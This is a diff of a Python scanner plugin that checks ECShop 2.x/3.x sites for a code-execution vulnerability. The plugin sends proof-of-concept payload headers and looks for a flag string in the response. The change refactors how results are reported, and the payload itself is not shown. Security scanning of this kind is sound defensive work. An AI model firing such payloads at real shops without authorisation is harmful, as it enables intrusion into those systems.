@@ -47,19 +47,26 @@ Cache-Control: max-age=0
     payload2 = headers.format(buildpoc(2))
     payload3 = headers.format(buildpoc(3))
     hh = hack.http(url, headers=payload2)
+    result = {
+        "name": "ecshop 2.x/3.x 代码执行",  # 插件名称
+        "content": "详情信息:http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/",  # 插件返回内容详情，会造成什么后果。
+        "url": "",  # 漏洞存在url
+        "log": {
+            "send": "send",
+            "response": "response"
+        },
+        "tag": "code_eval"  # 漏洞标签
+    }
+
     if flagText in hh.text():
-        return {
-            "vulname":"ecshop 2.x 代码执行",
-            "url":arg,
-            "log":hh.log
-        }
+        result["url"] = arg
+        result["log"] = hh.log
+        return result
     hh = hack.http(url, headers=payload3)
     if flagText in hh.text():
-        return {
-            "vulname": "ecshop 3.x 代码执行",
-            "url": arg,
-            "log": hh.log
-        }
+        result["url"] = arg
+        result["log"] = hh.log
+        return result
 
 
 if __name__ == '__main__':
